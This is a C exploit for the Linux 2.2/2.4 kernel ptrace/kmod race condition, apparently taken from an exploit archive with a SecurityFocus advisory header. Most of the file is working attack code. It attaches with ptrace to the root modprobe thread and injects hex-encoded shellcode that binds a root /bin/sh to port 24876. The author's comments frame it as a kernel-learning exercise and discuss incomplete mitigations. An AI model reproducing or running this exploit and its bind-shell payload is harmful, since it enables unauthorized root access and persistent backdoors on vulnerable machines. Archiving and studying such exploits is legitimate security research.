/*
source: http://www.securityfocus.com/bid/7112/info
 
A vulnerability has been discovered in the Linux kernel which can be exploited using the ptrace() system call. By attaching to an incorrectly configured root process, during a specific time window, it may be possible for an attacker to gain superuser privileges.
 
The problem occurs due to the kernel failing to restrict trace permissions on specific root spawned processes.
 
This vulnerability affects both the 2.2 and 2.4 Linux kernel trees.
*/

/*
 *  Author: snooq [http://www.angelfire.com/linux/snooq/]
 *  Date: 10 April 2003
 *
 *  Wojciech Purczynski [ cliph@isec.pl ], says (in his code):
 *
 *  [quote]
 *	This code exploits a race condition in kernel/kmod.c, which creates
 *	kernel thread in insecure manner. This bug allows to ptrace cloned
 *	process, allowing to take control over privileged modprobe binary.
 *  [/quote]
 *
 *  For more info: http://www.securiteam.com/unixfocus/5FP0A2K9GQ.html
 *
 *  Temp fix --> echo XXX /proc/sys/kernel/modprobe
 *
 *  I've seen somewhere... somebody suggested 'chmod 700 /proc' as a quick
 *  fix....
 *
 *  The truth is... 'chmod 700 /proc' does not close the hole.
 *  It merely cripple the exploit... which reads /proc entries
 *
 *  The flaw is still exploitable without 'rwx' to /proc..
 *  
 *  Having said all these craps.... I must say that I'm still a newbie to 
 *  kernel stuffs.... and I think my code looks really ugly too....
 *
 *  so... if you r not happy wif the way I code.. or any suggestions for me..
 *  or even flames.... direct them to jinyean_at_hotmail_dot_com 
 *
 *  Well.. I dun usually do this.. but I will do it this time... 
 *  Greetz.. my team mates??? Nam, JF & ET?? haha...  
 * 
 *  just wanna thank u for reading these craps..  
 *  and to ET.. maybe next time.. I could join u as a kernel hacker... =p
 *
 *  Notes: 
 *  ======
 *  1. There are at least 2 versions of exploit out there..
 *     ie, Wojciech's and anszom's...
 *
 *  2. The way I exploit it is no diff from both except:
 *     -> mine is one attempt per run. Script it, if u need to
 *     -> bind port instead of spawn shell.. 
 *     -> dun bother to read /proc entries
 *     -> not as feature rich as anszom's
 *     -> not as reliable.... etc... etc..
 *  
 *  3. I coded this as an exercise.. as a way to learn bout kernel internals 
 *
 *  4. Lastly, credits go to Wojciech and anszom.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <linux/user.h>		/* For user_regs_struct */

#define SIZE	(sizeof(shellcode)-1)	

pid_t parent=0;
pid_t child=0;
pid_t k_child=0;
static int sigc=0;

/*
   Port binding shellcode, courtesy of <anszom@v-lo.krakow.pl>
   I just changed the port no..... =p 
*/

char shellcode[]=	
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\x31\xc0\x50\x40"
        "\x50\x40\x50\x8d\x58\xff\x89\xe1\xb0\x66\xcd\x80\x83\xec\xf4\x89"
        "\xc7\x31\xc0\xb0\x04\x50\x89\xe0\x83\xc0\xf4\x50\x31\xc0\xb0\x02"
        "\x50\x48\x50\x57\x31\xdb\xb3\x0e\x89\xe1\xb0\x66\xcd\x80\x83\xec"
        "\xec\x31\xc0\x50\x66\xb8\x61\x2c\xc1\xe0\x10\xb0\x02\x50\x89\xe6"
        "\x31\xc0\xb0\x10\x50\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x83"
        "\xec\xec\x85\xc0\x75\x59\xb0\x01\x50\x57\x89\xe1\xb0\x66\xb3\x04"
        "\xcd\x80\x83\xec\xf8\x31\xc0\x50\x50\x57\x89\xe1\xb0\x66\xb3\x05"
        "\xcd\x80\x89\xc3\x83\xec\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74"
        "\x08\x31\xc0\xb0\x06\xcd\x80\xeb\xdc\x31\xc0\xb0\x3f\x31\xc9\xcd"
        "\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31"
        "\xc0\x50\xeb\x13\x89\xe1\x8d\x54\x24\x04\x5b\xb0\x0b\xcd\x80\x31"
        "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe8\xff\xff\xff/bin/sh";

void sigchld() {
	sigc++;
	return;
}

void sigalrm() {
	fprintf(stderr,"-> Something wrong and it timeout.\n");
	exit(0);
}

main(int argc, char *argv[]) {

	int i, error;
	pid_t pid;

	struct user_regs_struct regs;	/* Registers Structure */

	parent=getpid();

	switch (pid=fork()) {

	case -1:
		perror("Can't fork(): ");
		break;
	
	case 0:			/* Child's thread -- The attacking thread. */

		child=getpid();
		k_child=child+1;	/* Kernel child's PID... Hopefully.. */

		fprintf(stderr, "-> Parent's PID is %d. Child's PID is %d.\n", parent, child);

		fprintf(stderr, "-> Attaching to %d...", k_child);

		/* 
		   Trying to attach to the child spawned by the kernel, which has both
		   euid and egid set to 0. Child will be sent a SIGSTOP and we, the 'parent',
		   will get a SIGCHLD. This process is not immediate. Hence, we need to 
		   wait before we continue. Otherwise, we will fail controlling the thread.
		*/

		signal(SIGCHLD,sigchld);
		signal(SIGALRM,sigalrm);
		alarm(10);

		while ((error=ptrace(PTRACE_ATTACH,k_child,0,0)==-1) && (errno==ESRCH)) {
			fprintf(stderr, ".");
		}

		if (error==-1) {
			fprintf(stderr,"-> Unable to attach to %d.\n",k_child);
			exit(0);
		}

		fprintf(stderr, "\n-> Got the thread!!\n");

		/* 
		   Waiting for the firt SIGCHLD, which signals the end of the attaching action.
		*/

		while(sigc<1);
		
		if (ptrace(PTRACE_SYSCALL,k_child,0,0)==-1) {
			fprintf(stderr,"-> Unable to setup syscall trace.\n");
			exit(0);
		}

		/*
		   The thread is under our control now. Will wail for the next signal 
		   to inject our own code.
		*/

		fprintf(stderr,"-> Waiting for the next signal...\n");
		while(sigc<2);

		if (ptrace(PTRACE_GETREGS,k_child,NULL,&regs)==-1) {
			perror("-> Unable to read registers: ");
		}
	
		fprintf(stderr, "-> Injecting shellcode at 0x%08x\n",regs.eip);
		
		for (i=0; i<=SIZE; i+=4) {
			if( ptrace(PTRACE_POKETEXT,k_child,regs.eip+i,*(int*)(shellcode+i))) {}
		}

		fprintf(stderr, "-> Bind root shell on port 24876... =p\n");

		/*
		   All done. It's time to leave 'our' poor child alone.... ;)
		   and get ready to kill ourselves... 
		*/

		if (ptrace(PTRACE_DETACH,k_child,0,0)==-1) {
			perror("-> Unable to detach from modprobe thread: ");
		}

		fprintf(stderr, "-> Detached from modprobe thread.\n");
		fprintf(stderr, "-> Committing suicide.....\n");

		if (kill(parent,9)==-1) {	/* This is really ugly..... */
			perror("-> We survived??!!??  ");
		}

		/*
		   We should be dead by now. 
		*/

		exit(0); 

		break;

	default:		/* Parent's thread -- The vulnerable call */
	
		/*
		   Now, the parent is requesting a feature in a kernel module.
		   Such action will trigger the kernel to spawn a child with
		   euid=0, egid=0.... Voila!!!
			
		   NB: See <linux/socket.h> for more info.	
		*/
		signal(SIGALRM,sigalrm);
		alarm(10);
		socket(AF_SECURITY,SOCK_STREAM,1);
		break;
	}
	exit(0);

}